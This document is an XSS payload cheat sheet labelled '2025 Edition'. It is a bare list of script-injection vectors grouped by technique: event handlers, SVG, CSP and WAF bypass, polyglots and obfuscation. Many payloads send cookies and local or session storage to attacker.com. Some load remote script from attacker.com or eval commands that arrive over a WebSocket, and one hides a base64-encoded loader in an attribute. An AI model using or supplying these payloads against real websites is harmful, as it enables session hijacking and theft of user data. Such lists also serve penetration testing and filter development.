# Modern XSS Payloads - 2025 Edition

# Basic JavaScript Execution
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
<script>alert(window.origin)</script>
<script>console.log(window.localStorage)</script>
<script>console.log(window.sessionStorage)</script>

# HTML5 Attribute Event Handlers
<img src=x onerror=alert(1)>
<img src=x onerror=alert(document.domain)>
<img src=x onerror=alert(document.cookie)>
<img src=x onerror=fetch('https://attacker.com/steal?cookie='+document.cookie)>
<img src=x onerror=fetch('https://attacker.com/steal?localStorage='+JSON.stringify(localStorage))>
<img src=x onerror=fetch('https://attacker.com/steal?sessionStorage='+JSON.stringify(sessionStorage))>
<img src=x onerror=window.location='https://attacker.com/steal?cookie='+document.cookie>

# SVG Based Vectors
<svg onload=alert(1)>
<svg/onload=alert(1)>
<svg onload=alert(document.domain)>
<svg onload=alert(document.cookie)>
<svg/onload=alert(document.domain)>
<svg/onload=alert(document.cookie)>
<svg/onload=fetch('https://attacker.com/steal?cookie='+document.cookie)>
<svg><script>alert(1)</script></svg>
<svg><script>alert(document.domain)</script></svg>
<svg><script>alert(document.cookie)</script></svg>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><animate attributeName=x dur=1s onbegin=alert(1)>
<svg><animate attributeName=x dur=1s onend=alert(1)>
<svg><set attributeName=x dur=1s onbegin=alert(1)>
<svg><set attributeName=x dur=1s onend=alert(1)>
<svg><style>{font-family:'<iframe/onload=alert(1)>'}</style>
<svg><style>{font-family:'<iframe/onload=alert(document.domain)>'}</style>

# Modern Browser APIs
<script>fetch('https://attacker.com/steal', {method:'POST',body:document.cookie});</script>
<script>navigator.sendBeacon('https://attacker.com/steal', document.cookie);</script>
<script>window.postMessage(document.cookie, '*');</script>
<script>localStorage.setItem('xss', document.cookie);</script>
<script>sessionStorage.setItem('xss', document.cookie);</script>
<script>document.location='https://attacker.com/steal?c='+document.cookie;</script>
<script>window.location='https://attacker.com/steal?c='+document.cookie;</script>
<script>window.open('https://attacker.com/steal?c='+document.cookie);</script>
<script>window.history.pushState('', '', '?xss='+document.cookie);</script>
<script>window.history.replaceState('', '', '?xss='+document.cookie);</script>

# CSP Bypass Techniques
<script nonce=a>alert(1)</script>
<script nonce=%%NONCE%%>alert(1)</script>
<base href=//attacker.com>
<link rel=import href=data:text/html,<script>alert(1)</script>>
<iframe srcdoc="<script>alert(1)</script>">
<script src="data:,alert(1)">
<script src="//attacker.com/xss.js">

# Mutation XSS
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<img src="x" onerror="a=document.createElement('script');a.src='//attacker.com/xss.js';document.body.appendChild(a)">
<svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>

# Polyglot XSS
javascript:"/*\"/*'/*`/*\`/*\"/*</script></title></style></textarea></noscript></template><img src=" onerror=alert(1)//">
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//\x3e

# Exotic Context XSS
<link rel=stylesheet href="javascript:alert(1)">
<style>@import 'javascript:alert(1)';</style>
<div style="background-image: url(javascript:alert(1))">
<div style="width: expression(alert(1))">
<div style="background:url(javascript:alert(1))">
<div style="behavior: url(#default#time2)" onbegin="alert(1)">

# Mutation Observer XSS
<img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8vYXR0YWNrZXIuY29tL3hzcy5qcyI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61;&#61; onerror=eval(atob(this.id))>

# Exotic Attribute XSS
<xss id=x tabindex=1 onactivate=alert(1)>
<xss id=x tabindex=1 onfocus=alert(1)>
<xss id=x tabindex=1 onfocusin=alert(1)>
<xss id=x tabindex=1 onfocusout=alert(1)>
<xss id=x tabindex=1 onblur=alert(1)>

# JSON Injection
<script>
var data = {"name":"</script><script>alert(1)</script>"};
</script>

# Template Injection
<template id="template"><script>alert(1)</script></template>
<div data-bind="html: '<script>alert(1)</script>'"></div>

# Shadow DOM XSS
<div id="shadow"></div><script>
var shadow = document.querySelector('#shadow').attachShadow({mode: 'open'});
shadow.innerHTML = '<script>alert(1)<\/script>';
</script>

# WebSocket XSS
<script>
var ws = new WebSocket('ws://attacker.com');
ws.onmessage = function(e) {
  eval(e.data);
};
</script>

# WebWorker XSS
<script>
var blob = new Blob(['self.onmessage = function(e) { self.postMessage(eval(e.data)); }'], {type: 'application/javascript'});
var worker = new Worker(URL.createObjectURL(blob));
worker.onmessage = function(e) { alert(e.data); };
worker.postMessage('alert(1)');
</script>

# Service Worker XSS
<script>
navigator.serviceWorker.register('sw.js').then(function(reg) {
  console.log('Service worker registered!', reg);
}).catch(function(err) {
  console.log('Service worker registration failed: ', err);
});
</script>

# Prototype Pollution XSS
<script>
Object.prototype.toString = function() { return 'alert(1)'; };
setTimeout('confirm(toString())', 100);
</script>

# DOM Clobbering XSS
<form id="test"><input id="parentNode" name="innerHTML" value="<script>alert(1)</script>"></form>

# CSS Injection XSS
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>
<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xss>
<style>@keyframes x{}</style><xss style="animation-name:x" onwebkitanimationstart="alert(1)"></xss>

# HTML5 Sandbox Escape
<iframe sandbox="allow-scripts allow-same-origin" src="data:text/html,<script>alert(1)</script>"></iframe>

# Dangling Markup Injection
<img src='https://attacker.com/log?

# Modern Browser Features
<script>
// Clipboard API
navigator.clipboard.writeText('Clipboard XSS');
// Credential Management API
navigator.credentials.get({password: true});
// Web Bluetooth
navigator.bluetooth.requestDevice({acceptAllDevices: true});
// Web USB
navigator.usb.requestDevice({filters: []});
// Web Share API
navigator.share({title: 'XSS', text: document.cookie, url: 'https://attacker.com'});
</script>

# HTTP Header Injection
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
<meta http-equiv="Set-Cookie" content="session=document.cookie; path=/">
<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline'">

# Modern Obfuscation Techniques
<script>eval(atob('YWxlcnQoMSk='))</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
<script>window['al'+'ert'](1)</script>
<script>this['al'+'ert'](1)</script>
<script>top['al'+'ert'](1)</script>
<script>parent['al'+'ert'](1)</script>
<script>frames['al'+'ert'](1)</script>
<script>self['al'+'ert'](1)</script>
<script>globalThis['al'+'ert'](1)</script>
<script>var _=alert;_(1)</script>
<script>var _='alert';this[_](1)</script>
<script>var _=this;_['alert'](1)</script>
<script>var _=this;_['al'+'ert'](1)</script>
<script>(()=>{return this})()['al'+'ert'](1)</script>
<script>var _=''['constructor'];_(alert(1))();</script>
<script>var _=''['constructor'];_('alert(1)')();</script>
<script>var _=''['constructor']['constructor'];_('alert(1)')();</script>
<script>var _=''['constructor']['constructor'];_('alert(document.domain)')();</script>
<script>var _=''['constructor']['constructor'];_('alert(document.cookie)')();</script>

# Advanced WAF Bypass
<script>[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164\50\61\51')();</script>
<script>\u0065\u0076\u0061\u006c(\u0061\u0074\u006f\u0062('\u0059\u0057\u0078\u006c\u0063\u006e\u0051\u006f\u004d\u0053\u006b\u003d'))</script>
<script>\u0077\u0069\u006e\u0064\u006f\u0077['\u0061\u006c\u0065\u0072\u0074'](1)</script>
<script>\u0077\u0069\u006e\u0064\u006f\u0077['\u0061\u006c\u0065\u0072\u0074']('\u0058\u0053\u0053')</script>
<script>\u0077\u0069\u006e\u0064\u006f\u0077['\u0061\u006c\u0065\u0072\u0074']('\u0058\u0053\u0053 \u0062\u0079 \u0041\u0065\u0074\u0068\u0065\u0072\u0058\u0053\u0053')</script>

# 2025 Advanced Techniques
<script type="module">import('data:text/javascript,alert(1)');</script>
<script type="module">import('data:text/javascript,alert(document.domain)');</script>
<script type="module">import('data:text/javascript,alert(document.cookie)');</script>
<script type="module">import('//attacker.com/xss.js');</script>
<script type="importmap">{"imports":{"x":"data:text/javascript,alert(1)"}}</script><script type="module">import('x');</script>
<script>const x = new Function('return alert(1)')(); x();</script>
<script>const x = new Function('return alert(document.domain)')(); x();</script>
<script>const x = new Function('return alert(document.cookie)')(); x();</script>
<script>setTimeout('alert\x281\x29')</script>
<script>setTimeout('alert\x28document.domain\x29')</script>
<script>setTimeout('alert\x28document.cookie\x29')</script>
<script>setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
<script>setTimeout(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))</script>
<script>setTimeout(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))</script>
